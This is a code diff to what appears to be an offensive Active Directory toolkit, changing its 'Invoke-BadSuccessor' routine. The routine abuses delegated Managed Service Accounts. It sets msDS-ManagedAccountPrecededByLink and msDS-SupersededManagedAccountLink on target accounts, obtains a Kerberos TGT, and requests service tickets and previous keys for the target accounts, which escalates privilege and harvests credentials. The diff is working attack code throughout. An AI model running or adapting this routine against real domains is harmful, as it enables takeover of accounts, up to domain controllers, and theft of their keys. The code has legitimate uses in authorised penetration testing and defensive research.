@@ -6572,7 +6572,7 @@ displayName=New Group Policy Object
 				basedn = self.root_dn
 			elif len(writable_ous) > 1:
 				c_key = 0
-				logging.warning('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is reachable')
+				logging.warning('[Invoke-BadSuccessor] We have more than one writable OU. Please choose one that is writable')
 				cnt = 0
 				for ou in writable_ous:
 					print(f"{cnt}: {ou['attributes']['distinguishedName']}")
@@ -6634,6 +6634,13 @@ displayName=New Group Policy Object
 			logging.error(f"[Invoke-BadSuccessor] No targets account found")
 			return
 		
+		tgt = self.conn.get_TGT()
+		if not tgt:
+			userName = Principal(self.conn.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+			tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.conn.password, self.conn.get_domain(),
+																unhexlify(self.conn.lmhash), unhexlify(self.conn.nthash), self.conn.auth_aes_key,
+																self.conn.kdcHost)
+		
 		entries = []
 		for target in targets:
 			target_dn = target.get('attributes', {}).get('distinguishedName')
@@ -6643,17 +6650,15 @@ displayName=New Group Policy Object
 				continue
 			succeeded = self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, [target_dn])], 'msDS-DelegatedMSAState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.MIGRATED.value])]})
 			if not succeeded:
-				logging.warning(f"[Invoke-BadSuccessor] Failed to target {target_san or target_dn}")
-			logging.debug(f"[Invoke-BadSuccessor] Successfully modified msDS-ManagedAccountPrecededByLink to {target_dn}")
-		
-			tgt = self.conn.get_TGT()
-			if not tgt:
-				userName = Principal(self.conn.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-				tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.conn.password, self.conn.get_domain(),
-																	unhexlify(self.conn.lmhash), unhexlify(self.conn.nthash), self.conn.auth_aes_key,
-																	self.conn.kdcHost)
+				logging.warning(f"[Invoke-BadSuccessor] Failed to change msDS-ManagedAccountPrecededByLink to {target_san or target_dn}")
 
-			tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.request_dmsa_st(tgt, cipher, oldSessionKey, sessionKey, self.conn.kdcHost, self.conn.get_domain(), dmsaname + '$' if not dmsaname.endswith('$') else dmsaname)
+			succeeded = self.ldap_session.modify(target_dn, {'msDS-SupersededManagedAccountLink': [(ldap3.MODIFY_REPLACE, [dmsa_dn])], 'msDS-SupersededServiceAccountState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.MIGRATED.value])]})
+			if not succeeded:
+				logging.warning(f"[Invoke-BadSuccessor] Failed to change msDS-SupersededManagedAccountLink to {dmsa_dn}")
+			
+			logging.debug(f"[Invoke-BadSuccessor] Successfully modified dmsa and target account attributes")
+
+			tgs, rcipher, oldSessionKey, sessionKey, previous_keys = MSA.doDMSA(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.conn.nthash), self.conn.auth_aes_key, self.conn.kdcHost, self.conn.get_domain(), dmsaname + '$' if not dmsaname.endswith('$') else dmsaname)
 			if tgs:
 				sessionKey = oldSessionKey
 
@@ -6682,10 +6687,11 @@ displayName=New Group Policy Object
 		# self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, ["CN=DC01,OU=Domain Controllers,DC=range,DC=local"])]})
 
 		# cleanup, remove dmsa account
-		success = self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
-		if not success:
-			logging.error(f"[Invoke-BadSuccessor] Failed to remove DMSA account {dmsaname}")
-			return
+		if not exists:
+			success = self.remove_domaindmsa(identity=dmsaname, searchbase=basedn)
+			if not success:
+				logging.error(f"[Invoke-BadSuccessor] Failed to remove DMSA account {dmsaname}")
+				return
 		return entries
 
 	def get_netterminalsession(self, identity=None, username=None, password=None, domain=None, lmhash=None, nthash=None, port=445, args=None):
